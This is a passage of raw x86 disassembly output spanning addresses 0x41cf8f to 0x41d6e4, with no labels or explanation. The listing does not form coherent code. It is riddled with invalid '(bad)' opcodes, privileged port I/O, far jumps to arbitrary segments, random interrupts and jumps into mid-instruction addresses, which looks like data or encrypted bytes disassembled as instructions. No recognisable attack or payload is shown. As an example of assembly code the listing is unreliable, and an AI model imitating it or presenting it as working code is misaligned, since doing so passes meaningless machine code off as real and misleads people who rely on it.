  41cf8f:	js     0x41cf45
  41cf91:	adc    al,0x49
  41cf93:	or     bh,BYTE PTR [ecx]
  41cf95:	mov    bl,0x81
  41cf97:	mov    ebp,DWORD PTR [ebp+0x50]
  41cf9a:	mov    edi,0xeaf477bf
  41cf9f:	xor    al,0xa
  41cfa1:	or     eax,0x2ec117bf
  41cfa6:	scas   al,BYTE PTR es:[edi]
  41cfa7:	daa    
  41cfa8:	xchg   esp,eax
  41cfa9:	data16 fst st(0)
  41cfac:	int3   
  41cfad:	add    eax,0xb41ffbd4
  41cfb2:	fld    st(4)
  41cfb4:	iret   
  41cfb5:	mov    al,ds:0xf6bb8d5e
  41cfba:	xchg   DWORD PTR [edx+0x2f21db58],ebp
  41cfc0:	mov    ebx,DWORD PTR [edi]
  41cfc2:	fwait
  41cfc3:	pop    ecx
  41cfc4:	sub    DWORD PTR [edi+0x44],eax
  41cfc7:	dec    ebp
  41cfc8:	dec    eax
  41cfc9:	add    edi,DWORD PTR [ecx]
  41cfcb:	push   edi
  41cfcc:	stos   BYTE PTR es:[edi],al
  41cfcd:	int3   
  41cfce:	sbb    eax,0x2066d753
  41cfd3:	addr16 jo 0x41cfc6
  41cfd6:	push   edx
  41cfd7:	mov    ds:0x9edc2d2c,al
  41cfdc:	push   ebx
  41cfdd:	aam    0xe0
  41cfdf:	cld    
  41cfe0:	call   0x12e4:0x3b4c155c
  41cfe7:	jp     0x41cfbf
  41cfe9:	cmp    dh,BYTE PTR [edx+0x6]
  41cfec:	je     0x41cfdf
  41cfee:	js     0x41d006
  41cff0:	xchg   DWORD PTR ds:0x210a7c43,eax
  41cff6:	(bad)  [edi+edx*8+0x9]
  41cffa:	sbb    eax,0xccf71e3f
  41cfff:	stos   DWORD PTR es:[edi],eax
  41d000:	int    0x3a
  41d002:	pusha  
  41d003:	or     BYTE PTR [edx-0x5],bl
  41d006:	and    eax,0xcc831240
  41d00b:	mov    ebp,0x49fad2bc
  41d010:	clc    
  41d011:	aas    
  41d012:	and    BYTE PTR [ebx-0x69],al
  41d015:	xchg   ebp,eax
  41d016:	mov    WORD PTR [ebp+edi*4+0x7fbbf535],fs
  41d01d:	jno    0x41d024
  41d01f:	inc    esi
  41d020:	dec    eax
  41d021:	cmp    al,0x5f
  41d023:	sub    bl,BYTE PTR [edx-0xf]
  41d026:	inc    ebp
  41d027:	jp     0x41d050
  41d029:	push   es
  41d02a:	int    0x71
  41d02c:	and    edi,DWORD PTR [eax+0x5ec9462a]
  41d032:	or     DWORD PTR [ecx-0x58],0x3389bf06
  41d039:	retf   
  41d03a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d03b:	lods   eax,DWORD PTR ds:[esi]
  41d03c:	and    DWORD PTR [ecx+0x9da83c1],edx
  41d042:	inc    edx
  41d043:	int    0xff
  41d045:	adc    eax,0x2f0ef356
  41d04a:	shr    BYTE PTR [ecx-0x23fd7484],0x30
  41d051:	lea    edi,[esi+0x2b]
  41d054:	out    dx,eax
  41d055:	xchg   esi,eax
  41d056:	cli    
  41d057:	inc    edx
  41d058:	imul   ecx,DWORD PTR [edx],0x33205094
  41d05e:	mov    ah,0x6f
  41d060:	inc    eax
  41d061:	rcr    BYTE PTR [ecx],1
  41d063:	mov    dl,0x7b
  41d065:	mov    ah,BYTE PTR [edx]
  41d067:	sbb    al,dh
  41d069:	jno    0x41d0de
  41d06b:	adc    BYTE PTR [edi+0x402c7aff],bh
  41d071:	jle    0x41d07e
  41d073:	adc    al,0x7c
  41d075:	dec    cl
  41d077:	mov    ds:0x87453ba6,al
  41d07c:	scas   eax,DWORD PTR es:[edi]
  41d07d:	xchg   esi,eax
  41d07e:	cmp    bh,BYTE PTR [ecx+0x31]
  41d081:	lock and eax,0xd824ad51
  41d087:	ret    
  41d088:	push   ebx
  41d089:	pop    es
  41d08a:	mov    bl,bh
  41d08c:	xchg   ebp,eax
  41d08d:	jne    0x41d065
  41d08f:	jg     0x41d104
  41d091:	jb     0x41d018
  41d093:	dec    esi
  41d094:	in     eax,dx
  41d095:	lods   eax,DWORD PTR ds:[esi]
  41d096:	or     bh,BYTE PTR [edx+0x13040dc8]
  41d09c:	and    esp,DWORD PTR [eax-0x733617fe]
  41d0a2:	lds    esi,FWORD PTR [eax]
  41d0a4:	and    BYTE PTR [edi-0x56b0ea17],ah
  41d0aa:	xchg   esi,eax
  41d0ab:	popa   
  41d0ac:	lock jae 0x41d0e1
  41d0af:	pop    edi
  41d0b0:	mov    al,ds:0x234a4e85
  41d0b5:	add    DWORD PTR [esi-0x14],esp
  41d0b8:	mov    cl,0x58
  41d0ba:	call   0x9447:0xb802cf9b
  41d0c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0c2:	shl    BYTE PTR [edx+0x3b38d528],cl
  41d0c8:	je     0x41d0b7
  41d0ca:	outs   dx,DWORD PTR ds:[esi]
  41d0cb:	jmp    0x41d104
  41d0cd:	ret    
  41d0ce:	or     dl,BYTE PTR [edi]
  41d0d0:	pusha  
  41d0d1:	shl    edx,1
  41d0d3:	inc    edi
  41d0d4:	xchg   BYTE PTR [esi-0x65],dh
  41d0d7:	daa    
  41d0d8:	ins    DWORD PTR es:[edi],dx
  41d0d9:	leave  
  41d0da:	push   edx
  41d0db:	add    ah,cl
  41d0dd:	jp     0x41d0b8
  41d0df:	mov    BYTE PTR [ecx],dl
  41d0e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0e2:	lahf   
  41d0e3:	push   ds
  41d0e4:	mov    al,ds:0xbd8caba6
  41d0e9:	jbe    0x41d132
  41d0eb:	xor    al,0x4c
  41d0ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0ee:	sbb    eax,0x322345a6
  41d0f3:	add    eax,0x28c538fa
  41d0f8:	dec    edx
  41d0f9:	cmp    ch,0xac
  41d0fc:	js     0x41d0f7
  41d0fe:	inc    eax
  41d0ff:	dec    esi
  41d100:	sti    
  41d101:	into   
  41d102:	push   es
  41d103:	pop    eax
  41d104:	pop    ecx
  41d105:	ja     0x41d0d3
  41d107:	xor    edi,DWORD PTR [ecx+ebp*1-0x36]
  41d10b:	sub    DWORD PTR [ebx],0x1ebd06be
  41d111:	out    dx,al
  41d112:	ret    
  41d113:	ret    
  41d114:	js     0x41d0a5
  41d116:	mov    ebx,0xe2bdde0a
  41d11b:	ja     0x41d0d7
  41d11d:	fneni(8087 only) 
  41d11f:	in     eax,dx
  41d120:	push   ss
  41d121:	scas   eax,DWORD PTR es:[edi]
  41d122:	mov    edi,0xb6b122ac
  41d127:	cmc    
  41d128:	or     ah,BYTE PTR [esi+0x227a418e]
  41d12e:	int3   
  41d12f:	lahf   
  41d130:	jno    0x41d0c7
  41d132:	add    dh,BYTE PTR cs:[ebx+ebx*2-0x54]
  41d137:	cli    
  41d138:	sub    eax,0xc00e3a6a
  41d13d:	lods   eax,DWORD PTR ds:[esi]
  41d13e:	inc    ebp
  41d13f:	cmp    edi,0x9c9e5dff
  41d145:	xchg   ecx,eax
  41d146:	dec    edx
  41d147:	mov    eax,ds:0xbf6fff7d
  41d14c:	dec    ebx
  41d14d:	int    0xf5
  41d14f:	test   al,0xed
  41d151:	ss and al,0x5
  41d154:	push   ds
  41d155:	fist   WORD PTR [eax]
  41d157:	aas    
  41d158:	push   0xffffffdd
  41d15a:	dec    ebp
  41d15b:	aaa    
  41d15c:	push   ebx
  41d15d:	lea    ebp,[ebp-0x4]
  41d160:	in     al,0xfa
  41d162:	push   ss
  41d163:	mov    bl,0x3b
  41d165:	rcl    BYTE PTR gs:[esi-0x7e],cl
  41d169:	imul   DWORD PTR [ebx+edi*2-0x5d3e5c92]
  41d170:	mov    al,0xf8
  41d172:	push   edx
  41d173:	mov    BYTE PTR [edx+0x1df8738b],al
  41d179:	out    dx,eax
  41d17a:	xchg   ecx,eax
  41d17b:	push   esi
  41d17c:	push   ss
  41d17d:	push   cs
  41d17e:	push   ebx
  41d17f:	call   DWORD PTR [esi+0x42465970]
  41d185:	nop
  41d186:	xchg   esp,eax
  41d187:	ror    edi,0x9e
  41d18a:	cmp    dl,BYTE PTR [edi+0x5d815871]
  41d190:	jns    0x41d117
  41d192:	and    DWORD PTR [ebx-0x78],esi
  41d195:	out    dx,eax
  41d196:	sub    eax,0xd1fb91f6
  41d19b:	add    al,0x9a
  41d19d:	aaa    
  41d19e:	or     eax,0x3766724e
  41d1a3:	popf   
  41d1a4:	aad    0xfd
  41d1a6:	popa   
  41d1a7:	push   0x31
  41d1a9:	cmp    dh,cl
  41d1ab:	adc    bl,dl
  41d1ad:	mov    cl,0xbc
  41d1af:	push   0x13
  41d1b1:	jns    0x41d22c
  41d1b3:	inc    ebp
  41d1b4:	jmp    0x41d1ac
  41d1b6:	xchg   edx,eax
  41d1b7:	cld    
  41d1b8:	and    eax,0xa8c9276
  41d1bd:	out    0x7,al
  41d1bf:	sub    BYTE PTR es:[eax+0x2798819f],ah
  41d1c6:	mov    ds:0x66292b5c,eax
  41d1cb:	stos   DWORD PTR es:[edi],eax
  41d1cc:	dec    ebp
  41d1cd:	mov    edi,0xa78280f1
  41d1d2:	je     0x41d251
  41d1d4:	xor    ecx,DWORD PTR [esi]
  41d1d6:	inc    esi
  41d1d7:	cmp    eax,0xfbbe0026
  41d1dc:	pushf  
  41d1dd:	push   edx
  41d1de:	pop    ss
  41d1df:	jp     0x41d1d5
  41d1e1:	and    dh,BYTE PTR [ecx+0x3]
  41d1e4:	mov    bh,0x9d
  41d1e6:	stc    
  41d1e7:	cmp    BYTE PTR [esi+0x7c57ae5e],0xdf
  41d1ee:	sbb    dh,0x98
  41d1f1:	adc    bh,bl
  41d1f3:	out    0x8,eax
  41d1f5:	mov    ch,0x8d
  41d1f7:	pop    es
  41d1f8:	imul   ebp,esp,0xc64697ce
  41d1fe:	cmp    ecx,esi
  41d200:	and    al,0x10
  41d202:	add    DWORD PTR [edx],ebx
  41d204:	fiadd  WORD PTR [edx+0x1811fe7d]
  41d20a:	cmp    DWORD PTR [esi+0x1d],edi
  41d20d:	pop    ss
  41d20e:	int3   
  41d20f:	inc    ecx
  41d210:	mov    DWORD PTR [eax-0x1c],ebp
  41d213:	push   ecx
  41d214:	stos   DWORD PTR es:[edi],eax
  41d215:	cli    
  41d216:	mov    ds:0x18bd02c2,al
  41d21b:	sbb    BYTE PTR [edi+eax*2-0x1217eb80],0xbb
  41d223:	or     BYTE PTR ds:0x1bf722a1,0x1f
  41d22a:	xchg   ebp,eax
  41d22b:	cmp    ebx,eax
  41d22d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d22e:	mov    ebx,0x9fb59b55
  41d233:	cmp    eax,DWORD PTR [ebp-0x7d]
  41d236:	sbb    BYTE PTR [ebp-0x1cd01d7],ch
  41d23c:	nop
  41d23d:	stc    
  41d23e:	popa   
  41d23f:	ds ja  0x41d20c
  41d242:	cmp    dl,BYTE PTR [eax+0x2a]
  41d245:	dec    esi
  41d246:	mov    ah,bl
  41d248:	out    dx,eax
  41d249:	nop
  41d24a:	out    dx,al
  41d24b:	add    eax,0x5af86248
  41d250:	push   edi
  41d251:	add    DWORD PTR [eax-0x17fafb96],0x17
  41d258:	inc    eax
  41d259:	dec    ecx
  41d25a:	fsub   DWORD PTR [edi-0x68a50968]
  41d260:	loop   0x41d27f
  41d262:	loope  0x41d2a0
  41d264:	inc    ebx
  41d265:	cwde   
  41d266:	sub    BYTE PTR [ecx],al
  41d268:	inc    ecx
  41d269:	or     eax,0x5d422581
  41d26e:	mov    ah,BYTE PTR [edi]
  41d270:	and    ecx,DWORD PTR [eax-0x569722b2]
  41d276:	cmp    DWORD PTR [ecx-0x7f],esi
  41d279:	adc    eax,0xcc97ca52
  41d27e:	lea    edx,[eax]
  41d280:	mov    esi,0x10dedf88
  41d285:	add    cl,dl
  41d287:	sbb    edi,eax
  41d289:	aaa    
  41d28a:	repz ret 0x66de
  41d28e:	pop    ecx
  41d28f:	shr    BYTE PTR [eax+0xa],cl
  41d292:	push   ecx
  41d293:	ins    BYTE PTR es:[edi],dx
  41d294:	jecxz  0x41d311
  41d296:	xor    al,0xa6
  41d298:	mov    DWORD PTR [edi],eax
  41d29a:	bound  eax,QWORD PTR [esi+0x3e]
  41d29d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d29e:	and    bh,BYTE PTR [esi]
  41d2a0:	adc    al,0x3
  41d2a2:	push   esp
  41d2a3:	mov    edx,ds
  41d2a5:	inc    edx
  41d2a6:	ds mov esi,0xa67bc1a0
  41d2ac:	hlt    
  41d2ad:	es ins BYTE PTR es:[di],dx
  41d2b0:	pushf  
  41d2b1:	out    0x4a,al
  41d2b3:	or     eax,0xe0721928
  41d2b8:	rol    DWORD PTR [esi-0x6d50b7d6],0xc8
  41d2bf:	adc    dl,bl
  41d2c1:	push   edx
  41d2c2:	or     DWORD PTR [edi+ecx*4+0x7c0bed27],ebx
  41d2c9:	loop   0x41d325
  41d2cb:	cmp    eax,edi
  41d2cd:	ret    0x3fa2
  41d2d0:	or     DWORD PTR [ecx+0x33],edx
  41d2d3:	lea    esi,[ebp+ebx*1-0x3bf72e6a]
  41d2da:	add    eax,0x368447ce
  41d2df:	push   cs
  41d2e0:	xchg   ebx,eax
  41d2e1:	inc    esi
  41d2e2:	pop    ebp
  41d2e3:	mov    BYTE PTR [edi],al
  41d2e5:	cmc    
  41d2e6:	je     0x41d357
  41d2e8:	xor    dh,BYTE PTR [esi-0x4fddc44e]
  41d2ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2ef:	scas   eax,DWORD PTR es:[edi]
  41d2f0:	sub    dh,BYTE PTR [esi+edi*2]
  41d2f3:	cmp    ah,BYTE PTR [ebx+edx*2+0x5c]
  41d2f7:	adc    BYTE PTR [eax],dl
  41d2f9:	ficom  DWORD PTR [ebx]
  41d2fb:	out    0x15,eax
  41d2fd:	arpl   WORD PTR [ecx],di
  41d2ff:	jle    0x41d347
  41d301:	dec    esp
  41d302:	inc    esp
  41d303:	loopne 0x41d2f0
  41d305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d306:	xor    eax,0x9391585f
  41d30b:	lods   eax,DWORD PTR ds:[esi]
  41d30c:	fld1   
  41d30e:	inc    esp
  41d30f:	sbb    ebx,DWORD PTR [ebp+edx*2+0x71]
  41d313:	fst    QWORD PTR [ecx-0x29]
  41d316:	jle    0x41d2d7
  41d318:	push   ds
  41d319:	lahf   
  41d31a:	mov    dh,0xfa
  41d31c:	outs   dx,DWORD PTR ds:[esi]
  41d31d:	sti    
  41d31e:	in     eax,dx
  41d31f:	dec    edx
  41d320:	push   0x78
  41d322:	(bad)  
  41d323:	in     al,0xe7
  41d325:	imul   DWORD PTR [ecx*1-0x7b7b713f]
  41d32c:	sub    ebx,DWORD PTR [edx]
  41d32e:	jl     0x41d2d8
  41d330:	xor    al,0x90
  41d332:	pusha  
  41d333:	sub    DWORD PTR [ebp+0x3186ef8d],ecx
  41d339:	scas   al,BYTE PTR es:[edi]
  41d33a:	mov    ebp,0x9de66bb6
  41d33f:	retf   
  41d340:	repnz xor ah,BYTE PTR [ebp+0x4b]
  41d344:	inc    ecx
  41d345:	lds    ecx,FWORD PTR [ebp-0x7fb4b213]
  41d34b:	inc    esp
  41d34c:	ret    0xe8eb
  41d34f:	or     al,bl
  41d351:	xor    DWORD PTR [ebx-0x21ada84f],esi
  41d357:	adc    eax,ebp
  41d359:	ror    DWORD PTR [edi+0x35bd7081],0x70
  41d360:	test   DWORD PTR [eax-0x5b2286e3],esi
  41d366:	inc    ebx
  41d367:	xchg   edi,eax
  41d368:	packuswb mm5,QWORD PTR [ebp+esi*8-0x1f0a6d6e]
  41d370:	sti    
  41d371:	in     al,0x83
  41d373:	cmp    al,0x3d
  41d375:	test   eax,0x6d0af6ca
  41d37a:	jns    0x41d3d7
  41d37c:	shr    BYTE PTR [ebx],1
  41d37e:	inc    ecx
  41d37f:	adc    ecx,esp
  41d381:	idiv   dh
  41d383:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d384:	add    BYTE PTR [eax+eiz*2],bh
  41d387:	test   BYTE PTR ds:0x95c1b411,bl
  41d38d:	push   esp
  41d38e:	adc    dl,BYTE PTR [ecx]
  41d390:	int    0x59
  41d392:	ja     0x41d3b9
  41d394:	mov    bl,0x3d
  41d396:	adc    DWORD PTR [edx+0x53],eax
  41d399:	cli    
  41d39a:	fist   DWORD PTR [edx+0x388232e6]
  41d3a0:	jo     0x41d39c
  41d3a2:	xchg   DWORD PTR [edi+0x4756f742],ebp
  41d3a8:	mov    BYTE PTR [edi],dl
  41d3aa:	xor    DWORD PTR [ecx-0x6871313c],ebx
  41d3b0:	xlat   BYTE PTR ds:[ebx]
  41d3b1:	pop    edi
  41d3b2:	ins    BYTE PTR es:[edi],dx
  41d3b3:	sbb    eax,0xeae09b2d
  41d3b8:	and    al,0x70
  41d3ba:	popa   
  41d3bb:	ins    DWORD PTR es:[edi],dx
  41d3bc:	jg     0x41d427
  41d3be:	mov    esp,0xb443fe78
  41d3c3:	jmp    0xaa47:0x5ca2a70d
  41d3ca:	test   bh,bh
  41d3cc:	and    DWORD PTR [edi+0x72],ebp
  41d3cf:	sub    eax,0x2b6dc396
  41d3d4:	adc    edi,edx
  41d3d6:	(bad)  
  41d3d7:	fimul  DWORD PTR [ecx+ebx*4-0x53]
  41d3db:	ror    DWORD PTR [eax-0x7d45623a],0xf
  41d3e2:	mov    edx,0xd0a6e6fc
  41d3e7:	and    ebp,DWORD PTR [ebx]
  41d3e9:	in     al,0xe
  41d3eb:	test   BYTE PTR [ebx+0x4d],bl
  41d3ee:	jmp    0x30795897
  41d3f3:	mov    esp,0xd361037
  41d3f8:	inc    eax
  41d3f9:	and    ebp,DWORD PTR [edi]
  41d3fb:	mov    edi,DWORD PTR [edx-0xc]
  41d3fe:	loop   0x41d479
  41d400:	jnp    0x41d3c2
  41d402:	hlt    
  41d403:	test   DWORD PTR [eax],esi
  41d405:	jmp    0x41d3bd
  41d407:	add    BYTE PTR [esi+eax*4-0x24],al
  41d40b:	fwait
  41d40c:	pop    ecx
  41d40d:	jl     0x41d3b4
  41d40f:	xchg   esi,eax
  41d410:	mov    cl,0xf5
  41d412:	rcl    DWORD PTR [ebx-0x1],1
  41d415:	in     eax,dx
  41d416:	popf   
  41d417:	mov    ecx,0x387a7780
  41d41c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d41d:	jne    0x41d3d0
  41d41f:	push   eax
  41d420:	leave  
  41d421:	ficom  WORD PTR [esi]
  41d423:	pusha  
  41d424:	test   DWORD PTR [edx-0x11],edx
  41d427:	out    dx,al
  41d428:	mov    dh,0x89
  41d42a:	adc    ch,BYTE PTR [edi-0x3a]
  41d42d:	imul   esi,DWORD PTR [edx+ebx*8+0x518f07a7],0xffffffa6
  41d435:	pop    ss
  41d436:	out    dx,eax
  41d437:	and    eax,DWORD PTR [eax+0x4a]
  41d43a:	sbb    BYTE PTR [ebx],dh
  41d43c:	out    dx,eax
  41d43d:	std    
  41d43e:	push   0x78
  41d440:	outs   dx,DWORD PTR ds:[esi]
  41d441:	mov    ds:0x6dce6686,al
  41d446:	lea    esi,[esi+esi*8]
  41d449:	mov    edx,0x3fd10600
  41d44e:	scas   eax,DWORD PTR es:[edi]
  41d44f:	pop    ebp
  41d450:	in     eax,dx
  41d451:	shl    DWORD PTR [ebp-0x1a9f4bf],1
  41d457:	int3   
  41d458:	sahf   
  41d459:	sbb    BYTE PTR [edx+0x26],cl
  41d45c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d45d:	mov    bl,0x99
  41d460:	xchg   edi,eax
  41d461:	in     al,dx
  41d462:	js     0x41d497
  41d464:	xchg   esi,eax
  41d465:	xchg   edi,eax
  41d466:	dec    dl
  41d468:	xchg   esi,eax
  41d469:	out    dx,al
  41d46a:	xchg   edx,eax
  41d46b:	mov    eax,ds:0x2a2ad1c4
  41d470:	daa    
  41d471:	mov    ah,0x32
  41d473:	xchg   edx,eax
  41d474:	fcmovu st,st(2)
  41d476:	popa   
  41d477:	scas   al,BYTE PTR es:[edi]
  41d478:	jo     0x41d436
  41d47a:	and    cl,BYTE PTR [edx+0x151c8aa7]
  41d480:	adc    edi,esi
  41d482:	cmp    eax,0x601b7dba
  41d487:	add    esi,DWORD PTR [edx+0x2e]
  41d48a:	mov    BYTE PTR [edi],0xc8
  41d48d:	ret    
  41d48e:	nop
  41d48f:	stos   BYTE PTR es:[edi],al
  41d490:	and    dl,BYTE PTR [esi-0x65]
  41d493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d494:	(bad)  
  41d495:	cmp    eax,0xcd7a458c
  41d49a:	es in  al,0x37
  41d49d:	pusha  
  41d49e:	sahf   
  41d49f:	dec    ebp
  41d4a0:	or     edi,ecx
  41d4a2:	pop    eax
  41d4a3:	test   al,0xcd
  41d4a5:	jge    0x41d458
  41d4a7:	mov    bh,0x1f
  41d4a9:	fst    DWORD PTR [ebp+eax*2-0x355b9c06]
  41d4b0:	loope  0x41d437
  41d4b2:	(bad)  
  41d4b3:	fwait
  41d4b4:	bnd je 0x41d460
  41d4b7:	loope  0x41d52f
  41d4b9:	das    
  41d4ba:	stos   DWORD PTR es:[edi],eax
  41d4bb:	cmp    cl,bl
  41d4bd:	xchg   ebp,eax
  41d4be:	inc    ebp
  41d4bf:	in     al,dx
  41d4c0:	jmp    0x41d4e7
  41d4c2:	jne    0x41d4ed
  41d4c4:	pushf  
  41d4c5:	mov    ds:0xe6292950,al
  41d4ca:	in     eax,dx
  41d4cb:	or     DWORD PTR [edx],ecx
  41d4cd:	out    0xfa,eax
  41d4cf:	popf   
  41d4d0:	cmp    bh,BYTE PTR [ebp-0x48e5474d]
  41d4d6:	sbb    DWORD PTR [ebp+ebx*4+0x756a4ace],esp
  41d4dd:	sub    DWORD PTR [ebx],ebx
  41d4df:	int    0xa1
  41d4e1:	outs   dx,DWORD PTR ds:[esi]
  41d4e2:	add    eax,0xc667af73
  41d4e7:	push   es
  41d4e8:	nop
  41d4e9:	inc    edx
  41d4ea:	jecxz  0x41d4dd
  41d4ec:	lea    ebx,[esi]
  41d4ee:	into   
  41d4ef:	rol    edx,0xf1
  41d4f2:	xchg   edx,eax
  41d4f3:	xchg   edx,eax
  41d4f4:	jecxz  0x41d4c4
  41d4f6:	add    DWORD PTR [esi+edi*2-0x5b],esp
  41d4fa:	cdq    
  41d4fb:	js     0x41d495
  41d4fd:	mov    ah,cl
  41d4ff:	stc    
  41d500:	ds cmp cl,cl
  41d503:	gs jbe 0x41d49e
  41d506:	and    al,0x5f
  41d508:	jl     0x41d515
  41d50a:	in     eax,dx
  41d50b:	(bad)  
  41d50c:	cmp    cl,bh
  41d50e:	adc    eax,0x64aed11
  41d513:	iret   
  41d514:	cld    
  41d515:	or     ecx,esp
  41d517:	jnp    0x41d4b7
  41d519:	jae    0x41d56a
  41d51b:	test   DWORD PTR [eax+0x66ffe49d],ecx
  41d521:	mov    eax,DWORD PTR [esi-0x2de3b2eb]
  41d527:	out    dx,al
  41d528:	jl     0x41d532
  41d52a:	xchg   ecx,eax
  41d52b:	enter  0x7c7,0xa4
  41d52f:	in     al,0x90
  41d531:	test   BYTE PTR [edx],cl
  41d533:	cmp    eax,0x88ac90d6
  41d538:	push   ebp
  41d539:	cmp    eax,DWORD PTR [ebp-0x1e4fa5ec]
  41d53f:	dec    ecx
  41d540:	lds    esi,FWORD PTR [ebx+0x5b]
  41d543:	imul   esi,DWORD PTR [ebx+0x88a529e],0x56ef2c9b
  41d54d:	shl    DWORD PTR [edx+ebp*2+0x477cd139],0xff
  41d555:	in     al,0xf3
  41d557:	js     0x41d4f4
  41d559:	cmp    BYTE PTR [ecx-0x5a],0x15
  41d55d:	xor    eax,0x59dab953
  41d562:	out    0x34,al
  41d564:	daa    
  41d565:	xor    ah,BYTE PTR [ecx+0x73afe613]
  41d56b:	and    esp,eax
  41d56d:	dec    edx
  41d56e:	ss cld 
  41d570:	fldenv ds:0x825abb7
  41d576:	fwait
  41d577:	xor    DWORD PTR [ecx+ebp*2-0x1fcf0ba2],0x2a7c56
  41d582:	jae    0x41d518
  41d584:	push   ss
  41d585:	fadd   DWORD PTR ds:0x7670af8c
  41d58b:	push   ss
  41d58c:	fidivr DWORD PTR ds:0x8bcbdf6d
  41d592:	pop    esi
  41d593:	(bad)  
  41d594:	dec    eax
  41d595:	mov    eax,0x8a84358b
  41d59a:	push   eax
  41d59b:	push   edi
  41d59c:	ins    DWORD PTR es:[edi],dx
  41d59d:	cmp    al,0x3b
  41d59f:	xor    eax,DWORD PTR [ebx-0x6713dae2]
  41d5a5:	or     BYTE PTR [edx],0x77
  41d5a8:	mov    BYTE PTR [edx-0x5f],bl
  41d5ab:	xchg   ebx,eax
  41d5ac:	aam    0x83
  41d5ae:	mov    al,ds:0x39c0146b
  41d5b3:	jo     0x41d5f1
  41d5b5:	mov    ah,0xb0
  41d5b7:	mov    ds:0xd825807a,al
  41d5bc:	mov    bh,0x6e
  41d5be:	sub    al,BYTE PTR [ecx]
  41d5c0:	push   eax
  41d5c1:	popf   
  41d5c2:	mov    cl,0xf7
  41d5c4:	aas    
  41d5c5:	pushf  
  41d5c6:	out    dx,eax
  41d5c7:	jp     0x41d60f
  41d5c9:	dec    esi
  41d5ca:	cmp    DWORD PTR [ecx+0x64b65ae9],edx
  41d5d0:	adc    al,0xe
  41d5d2:	cmp    BYTE PTR [ecx+0x60056d99],al
  41d5d8:	xor    dl,BYTE PTR [edx]
  41d5da:	shl    DWORD PTR [esp+esi*4+0x73f7d3fb],cl
  41d5e1:	xchg   esp,eax
  41d5e2:	xor    dh,cl
  41d5e4:	jmp    0x51:0x4e793076
  41d5eb:	retf   
  41d5ec:	sar    BYTE PTR [esi+0x60a3a326],1
  41d5f2:	ret    0x6f01
  41d5f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5f6:	jns    0x41d5d1
  41d5f8:	sub    esp,DWORD PTR [edi+ecx*1]
  41d5fb:	ret    0x864
  41d5fe:	xor    esp,esp
  41d600:	push   ecx
  41d601:	xor    cl,BYTE PTR [ebx-0xafabc62]
  41d607:	pushf  
  41d608:	fsubr  DWORD PTR [ebx-0x3345463]
  41d60e:	lods   eax,DWORD PTR ds:[esi]
  41d60f:	pop    ecx
  41d610:	mov    BYTE PTR [eax],al
  41d612:	mov    ds:0xda8f6e7,al
  41d617:	mov    al,0x60
  41d619:	dec    ebx
  41d61a:	vmwrite edx,DWORD PTR [ebx]
  41d61d:	dec    ebp
  41d61e:	mov    WORD PTR [ebx+0x1e681c6d],?
  41d624:	sub    bl,BYTE PTR [ebx]
  41d626:	lods   al,BYTE PTR ds:[esi]
  41d627:	push   ebp
  41d628:	or     al,BYTE PTR [eax-0x24cb3ce5]
  41d62e:	adc    BYTE PTR [esi],0xb3
  41d631:	push   ecx
  41d632:	(bad)  
  41d633:	fdivr  DWORD PTR [ebp+0x75]
  41d636:	jbe    0x41d691
  41d638:	cwde   
  41d639:	ds mov edx,0x749eb4cc
  41d63f:	push   esp
  41d640:	and    bl,BYTE PTR [ebx+0x15ecd06e]
  41d646:	mov    ecx,DWORD PTR [eax+eax*2-0x443f8666]
  41d64d:	add    ecx,ebx
  41d64f:	es int 0x18
  41d652:	adc    cl,BYTE PTR [ebx-0x25e1052b]
  41d658:	xor    bh,dh
  41d65a:	or     ch,al
  41d65c:	out    dx,al
  41d65d:	stc    
  41d65e:	dec    eax
  41d65f:	out    0x24,al
  41d661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d662:	sbb    BYTE PTR [ebp+0x18],ch
  41d665:	push   0xa42f0577
  41d66a:	repz sbb al,0xb9
  41d66d:	cmp    edx,DWORD PTR [edi-0x5a5552b7]
  41d673:	inc    ebp
  41d674:	(bad)  
  41d675:	ja     0x41d6cd
  41d677:	xor    al,0xe5
  41d679:	cmc    
  41d67a:	push   ebx
  41d67b:	mov    esp,0x8bffcc58
  41d680:	mov    esp,0xf1419cf0
  41d685:	stc    
  41d686:	cs pop es
  41d688:	inc    edi
  41d689:	adc    DWORD PTR [ebx],eax
  41d68b:	fsub   DWORD PTR [edx+eax*8+0x46]
  41d68f:	push   ecx
  41d690:	into   
  41d691:	mov    ah,0x84
  41d693:	ins    DWORD PTR es:[edi],dx
  41d694:	js     0x41d647
  41d696:	inc    ecx
  41d697:	dec    ebp
  41d698:	nop
  41d699:	push   0xb
  41d69b:	pop    ebx
  41d69c:	mov    al,0x14
  41d69e:	ret    
  41d69f:	rol    BYTE PTR [ebx-0x30d5b436],1
  41d6a5:	outs   dx,DWORD PTR ds:[esi]
  41d6a6:	jl     0x41d665
  41d6a8:	cmp    ah,dl
  41d6aa:	cmp    BYTE PTR ds:0x47ff65e9,bl
  41d6b0:	ror    BYTE PTR [edx-0x50597608],1
  41d6b6:	xchg   esp,eax
  41d6b7:	repz inc ebx
  41d6b9:	pop    ecx
  41d6ba:	and    bh,BYTE PTR [esp+edi*1-0x79f46bd]
  41d6c1:	aad    0x6a
  41d6c3:	push   cs
  41d6c4:	sub    al,0xce
  41d6c6:	pop    es
  41d6c7:	mov    ebp,0x8f4c0fe7
  41d6cc:	inc    ebp
  41d6cd:	mov    cl,0x47
  41d6cf:	ins    BYTE PTR es:[edi],dx
  41d6d0:	jbe    0x41d667
  41d6d2:	or     ch,BYTE PTR [edi+0x6d6e545]
  41d6d8:	bound  edx,QWORD PTR [edi-0x29891726]
  41d6de:	arpl   di,sp
  41d6e0:	jge    0x41d6ae
  41d6e2:	(bad)  
  41d6e3:	lahf   
  41d6e4:	cld    
